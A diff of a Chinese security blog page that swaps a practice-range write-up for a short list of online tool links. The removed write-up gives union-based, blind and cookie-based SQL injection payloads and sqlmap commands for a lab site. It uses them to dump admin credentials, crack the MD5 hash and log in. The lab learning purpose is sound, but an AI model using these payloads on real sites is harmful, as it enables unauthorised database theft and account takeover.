@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>封神台靶场 |  小张之栈</title>
+      <title>在线工具 |  小张之栈</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -64,7 +64,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-封神台"
+  id="post-在线工具"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -75,7 +75,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  封神台靶场
+  在线工具
 </h1>
  
 
@@ -83,11 +83,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/05/15/%E5%B0%81%E7%A5%9E%E5%8F%B0/" class="article-date">
-  <time datetime="2023-05-15T14:25:25.000Z" itemprop="datePublished">2023-05-15</time>
+      <a href="/2023/05/11/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/" class="article-date">
+  <time datetime="2023-05-11T14:25:25.000Z" itemprop="datePublished">2023-05-11</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%BB%83/">靶场演练</a>
+    <a class="article-category-link" href="/categories/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/">在线工具</a>
   </div>
   
 <div class="word_count">
@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.1k</span>
+            <span class="post-count">101</span>
         </span>
     </span>
 
@@ -104,106 +104,23 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">4 分钟</span>
+            <span class="post-count">1 分钟</span>
         </span>
     </span>
 </div>
  
     </div>
       
-    <div class="tocbot"></div>
-
 
 
 
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="一、女神小芳"><a href="#一、女神小芳" class="headerlink" title="一、女神小芳"></a>一、女神小芳</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515211214636.png" alt="image-20230515211214636"></p>
-<h3 id="1-注入位置判断"><a href="#1-注入位置判断" class="headerlink" title="1.注入位置判断"></a>1.注入位置判断</h3><p>id&#x3D;1,2,3时有不同页面，猜测id处可以注入</p>
-<h3 id="2-注入类型判断（判断错误）"><a href="#2-注入类型判断（判断错误）" class="headerlink" title="2.注入类型判断（判断错误）"></a>2.注入类型判断（判断错误）</h3><p>&#x3D;&#x3D;<strong>显然没有回显位，故不用联合注入</strong>&#x3D;&#x3D;</p>
-<p>1’、1”时页面不正常且不显示内容，故没有报错注入</p>
-<p>&#x3D;&#x3D;首先进行数字型注入&#x3D;&#x3D;</p>
-<p>&#x3D;&#x3D;<code>id=1 and 1=1 时页面正常</code>&#x3D;&#x3D;</p>
-<p>&#x3D;&#x3D;<code>id=1 and 1=2 时页面不正常</code>&#x3D;&#x3D;</p>
-<p>&#x3D;&#x3D;故数字型盲注。&#x3D;&#x3D;</p>
-<p>看了wp才发现，原来还是可以用联合注入的，想当然了，以为回显位(order by)只出现在有输入框的地方。</p>
-<h2 id="3-联合注入"><a href="#3-联合注入" class="headerlink" title="3.联合注入"></a>3.联合注入</h2><h3 id="1-order-by判断可显示列数"><a href="#1-order-by判断可显示列数" class="headerlink" title="1.order by判断可显示列数"></a>1.order by判断可显示列数</h3><p><code>id=1 order by 3内容为空 by 2为正常值</code></p>
-<p>故回显位2</p>
-<h3 id="2-union-select"><a href="#2-union-select" class="headerlink" title="2.union select"></a>2.union select</h3><p><code>?id=10000 union select 1,2#</code> id&#x3D;-1这种不行，被处理过了</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515235328914.png" alt="image-20230515235328914"></p>
-<p>2改为database()，显示maoshe</p>
-<h3 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h3><p>?id&#x3D;10000 union select 1,(select group_concat(’~‘,table_name) from information_schema.tables where table_schema&#x3D;database())#</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515235921469.png" alt="image-20230515235921469"></p>
-<h3 id="4-爆列名"><a href="#4-爆列名" class="headerlink" title="4.爆列名"></a>4.爆列名</h3><p>?id&#x3D;10000%20union%20select%201,(select%20group_concat(%27~%27,column_name)%20from%20information_schema.columns%20where%20table_schema&#x3D;database()%20and%20table_name&#x3D;%27admin%27)#</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516001033181.png" alt="image-20230516001033181"></p>
-<h3 id="5-爆列名值"><a href="#5-爆列名值" class="headerlink" title="5.爆列名值"></a>5.爆列名值</h3><p>?id&#x3D;10000%20union%20select%201,(select group_concat(‘~’,password) from admin)#</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516001159511.png" alt="image-20230516001159511"></p>
-<h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h3><p>不能简单认为无输入框就没有联合注入，还是要多想，多尝试。</p>
-<h2 id="盲注过程，算是复习吧qaq"><a href="#盲注过程，算是复习吧qaq" class="headerlink" title="盲注过程，算是复习吧qaq"></a>盲注过程，算是复习吧qaq</h2><h3 id="3-数据库长度判断"><a href="#3-数据库长度判断" class="headerlink" title="3.数据库长度判断"></a>3.数据库长度判断</h3><p><code>id=1%20and%20length(database())&gt;5 时正常，&gt;6时不正常</code></p>
-<p>故database()长度为6</p>
-<h3 id="4-数据库爆破"><a href="#4-数据库爆破" class="headerlink" title="4.数据库爆破"></a>4.数据库爆破</h3><p><code>id=1 and ascii(substr(database(),&#123;1&#125;,1)) &gt; &#123;1&#125; #判断第一个字母</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515215548482.png" alt="image-20230515215548482"></p>
-<p>数据库名maoshe</p>
-<h3 id="5-表名长度判断"><a href="#5-表名长度判断" class="headerlink" title="5.表名长度判断"></a>5.表名长度判断</h3><p><code>id=1 and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;4正常，&gt;5时不正常</code></p>
-<p>故第一个表名长度5 </p>
-<h3 id="6-表名爆破"><a href="#6-表名爆破" class="headerlink" title="6.表名爆破"></a>6.表名爆破</h3><p><code>id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;maoshe&#39; limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;</code>#判断表名第一个字符</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515215706751.png" alt="image-20230515215706751"></p>
-<p>第一个表名admin</p>
-<p>第二个表名dirs</p>
-<p>第三个表名news</p>
-<p>第四个表名xss</p>
-<h3 id="7-列名长度判断"><a href="#7-列名长度判断" class="headerlink" title="7.列名长度判断"></a>7.列名长度判断</h3><p>id &#x3D;1 and (select length(column_name) from information_schema. columns where table_name &#x3D; ‘admin’ and table_schema &#x3D; ‘maoshe’  limit  0,1)&gt;1 &#x2F;&#x2F;列名</p>
-<h3 id="8-列名判断"><a href="#8-列名判断" class="headerlink" title="8.列名判断"></a>8.列名判断</h3><p><code>id =1 and ascii(substr((select column_name from information_schema.columns where table_name = &#39;admin&#39; and table_schema = &#39;maoshe&#39; limit  0,1),&#123;0&#125;,1))&gt;&#123;1&#125; //列名</code></p>
-<p>admin表的列名Id、username、passwGrd</p>
-<p>dirs表的列名paths</p>
-<p>news表的列名id、content</p>
-<p>xss表的列名id、user、pass</p>
-<h3 id="9-爆值"><a href="#9-爆值" class="headerlink" title="9.爆值"></a>9.爆值</h3><p>看下xss的pass字段吧</p>
-<p><code>id=1 and ascii(substr((select &#39;pass&#39; from &#39;xss&#39; limit  0,1),&#123;0&#125;,1))&gt;&#123;1&#125;</code></p>
-<p>嘶，没跑出来flag的字样的，哪里漏掉了</p>
-<h3 id="10-sqlmap"><a href="#10-sqlmap" class="headerlink" title="10.sqlmap"></a>10.sqlmap</h3><p>用sqlmap解决吧。</p>
-<blockquote>
-<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“ –dbs</p>
-<p>跑出了maoshe、test、information_schema</p>
-<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“  -D maoshe –tables</p>
-<p>表名没问题</p>
-<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“  -D maoshe -T admin –columns –dump</p>
-<p>emm，admin表中的列是password，脚本还跑错了。</p>
-</blockquote>
-<h1 id="二、WAF过滤"><a href="#二、WAF过滤" class="headerlink" title="二、WAF过滤"></a>二、WAF过滤</h1><h2 id="1-注入位置判断-1"><a href="#1-注入位置判断-1" class="headerlink" title="1.注入位置判断"></a>1.注入位置判断</h2><p><img src="/../../../Typora/img111/image-20230516095034637.png" alt="image-20230516095034637"></p>
-<p>找到新闻中任意一个具体页面，出现id&#x3D;171，猜测有注入点</p>
-<h2 id="2-尝试闭合"><a href="#2-尝试闭合" class="headerlink" title="2.尝试闭合"></a>2.尝试闭合</h2><p>and、单引号等，and的双写也被过滤了</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516095129031.png" alt="image-20230516095129031"></p>
-<p>提示过滤了and update delete ; insert mid master</p>
-<p>双引号和括号发现提示数据库出错</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516095308937.png" alt="image-20230516095308937"></p>
-<p>而且这个order by的话就到10了。</p>
-<p>各种传统关键字绕过尝试后，没其他办法了</p>
-<p>看了wp，才知道用cookie，这里我用的工具是burp。</p>
-<h2 id="3-先抓包"><a href="#3-先抓包" class="headerlink" title="3.先抓包"></a>3.先抓包</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516113815024.png" alt="image-20230516113815024"></p>
-<p>右键发送repeate，删除掉?id&#x3D;171，避免接受url参数，转而添加Cookie参数，先 添加id&#x3D;171试试</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516114902620.png" alt="image-20230516114902620"></p>
-<p>页面显示正常，可以尝试联合注入</p>
-<h2 id="4-联合注入"><a href="#4-联合注入" class="headerlink" title="4.联合注入"></a>4.联合注入</h2><h3 id="1-union-select"><a href="#1-union-select" class="headerlink" title="1.union select"></a>1.union select</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516115631577.png" alt="image-20230516115631577"></p>
-<p><code>id=1710000%20union%20select%201,2,3,4,5,6,7,8,9,10%20from%20admin;</code></p>
-<p>注意空格记得填充，无论是%20还是+都可以</p>
-<p>之所以加from admin，目的是猜测admin是否存在。</p>
-<p>显示结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516115712683.png" alt="image-20230516115712683"></p>
-<p>证明表admin是存在的</p>
-<h3 id="2-猜解字段名"><a href="#2-猜解字段名" class="headerlink" title="2.猜解字段名"></a>2.猜解字段名</h3><p>这里参考的官方wp是说，直接猜解常见字段名</p>
-<p><code>id=1710000%20union%20select%201,username,3,4,5,6,7,8,password,10%20from%20admin;</code></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516120410289.png" alt="image-20230516120410289"></p>
-<p>数字加字母的16位组合，看出密码像是md5特征，解密试试</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516121144887.png" alt="image-20230516121144887"></p>
-<p>得到明文内容为welcome的密码</p>
-<p>已知账号与密码，尝试后台登录。</p>
-<h3 id="3-登录"><a href="#3-登录" class="headerlink" title="3.登录"></a>3.登录</h3><p>这是根据经验猜解的后台路径吧。。。。根目录下&#x2F;admin</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516121550218.png" alt="image-20230516121550218"></p>
-<p>输入admin,welcome</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516121649512.png" alt="image-20230516121649512"></p>
-<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>当url上各种绕过尝试失效时，应该要联想到其它注入方式，如Cookie注入等。</p>
+  <p><a target="_blank" rel="noopener" href="https://c.runoob.com/compile/1/">PHP 在线工具 | 菜鸟工具 (runoob.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64 编码&#x2F;解码 - 在线工具 (toolhelper.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
+<p>[Nessus安装与使用_nessus安装使用教程_@Camelus的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&request_id=&biz_id=102&utm_term=windows">https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=windows</a> nessus安装&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-1-126803631.142^v87^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
  
       <!-- reward -->
       
@@ -268,12 +185,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/15/%E5%B0%81%E7%A5%9E%E5%8F%B0/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/11/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%85%B6%E5%AE%83%E5%B7%A5%E5%85%B7/" rel="tag">其它工具</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/" rel="tag">加密解密</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%96%E8%AF%91/" rel="tag">编译</a></li></ul>
 
     </footer>
   </div>
@@ -281,11 +198,15 @@
    
   <nav class="article-nav">
     
-    
-      <a href="/2023/05/14/NATAS/" class="article-nav-link">
-        <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">NATAS</div>
+      <a href="/2023/05/12/owasp-top10%E6%BC%8F%E6%B4%9E/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            owasp top10漏洞
+          
+        </div>
       </a>
+    
     
   </nav>
 
